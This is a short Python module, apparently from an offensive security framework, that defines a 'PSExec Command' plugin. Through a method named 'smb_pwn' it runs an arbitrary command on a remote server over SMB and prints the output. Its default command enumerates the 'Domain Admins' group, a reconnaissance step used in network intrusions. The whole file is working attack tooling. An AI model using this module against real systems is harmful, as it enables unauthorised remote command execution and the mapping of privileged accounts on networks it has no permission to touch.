import core.psexec
import os

class PSExecCommand(core.psexec.PSExec):

    NAME = "PSExec Command"
    DESCRIPTION = "Runs the specified command on the server"
    AUTHORS = ['zerosum0x0', 'TheNaterz']

    def load(self):
        super(PSExecCommand, self).load()
        self.options.register("COMMAND", 'net group "Domain Admins" /domain', "the command to run")

    def smb_pwn(self, client, ip, port):
        data = client.run_command(self.options.get("COMMAND"))
        self.print_good("Command output: %s%s" % (os.linesep, data))
